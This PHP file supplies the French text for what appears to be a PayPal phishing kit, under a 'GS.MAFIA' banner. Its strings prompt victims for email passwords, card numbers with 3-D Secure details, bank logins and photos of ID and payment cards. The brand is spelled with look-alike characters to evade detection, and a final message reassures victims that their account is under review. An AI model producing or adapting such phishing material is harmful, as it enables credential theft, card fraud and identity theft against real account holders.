<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "Email";
$gs_string2 = "Suivant";
$gs_string3 = "Vous avez des problèmes pour vous connecter?";
$gs_string4 = "ou";
$gs_string5 = "Inscrivez-vous";
$gs_string6 = "Contactez-nous";
$gs_string7 = "Confidentialité";
$gs_string8 = "Légal";
$gs_string9 = "Monde";
$gs_string10 = "Changer";
$gs_string11 = "Connexion";
$gs_string12 = "Votre sécurité est notre priorité absolue";
$gs_string13 = "Mettez à jour votre adresse de facturation";
$gs_string14 = "Prénom";
$gs_string15 = "Nom de famille";
$gs_string16 = "Adresse de rue";
$gs_string17 = "Ville";
$gs_string18 = "ZIP";
$gs_string19 = "Continuer";
$gs_string20 = "Commentaires";
$gs_string21 = "Mettre à jour les informations de la carte";
$gs_string22 = "Nom du titulaire de la carte";
$gs_string23 = "Mois";
$gs_string24 = "Année";
$gs_string25 = "Vérification 3-D sécurisée";
$gs_string26 = "Mettez à jour votre accès au courrier électronique";
$gs_string27 = "Adresse e-mail";
$gs_string28 = "Mot de passe de l'adresse e-mail";
$gs_string29 = "Joindre une copie de votre carte d'identité";
$gs_string30 = "Joindre une photo de votre carte (recto / verso)";
$gs_string31 = "Terminer";
$gs_string32 = "Mot de passe";
$gs_string33 = "Informations sur la carte";
$gs_string34 = "Numéro de carte";
$gs_string35 = "Pays";
$gs_string36 = "Félicitations";
$gs_string37 = "<center> Vos informations de compte soumises sont en cours de révision par notre personnel. <br> <br> En attendant, vous pouvez accéder à votre compte avec une sécurité renforcée. <br> <br> <b> Merci d'avoir choisi ΡayΡal. </ B> <br> <br> <center> <br> <b> Vous allez être redirigé pour vous connecter à votre compte ΡayΡal ... </ b> <br> <br> ";
$gs_string38 = "Vérification du compte - Centre de sécurité";
$gs_string39 = "Connectez-vous à votre compte PayPal";
$gs_string40 = "Vérification de compte - Centre de sécurité";
$gs_stringbk26 = "Mettez à jour votre identifiant de banque";
$gs_stringbk27 = "Nom d'utilisateur de connexion";
$gs_stringbk28 = "Mot de passe de connexion";
$gs_stringbk29 = "Nom de la banque";
$gs_idsub = "Veuillez confirmer votre identité";
$gs_idsub2 = "Photo de votre document d'identité (recto verso pour le permis de conduire ou la carte d'identité) à côté du recto de votre carte de paiement.";
?>
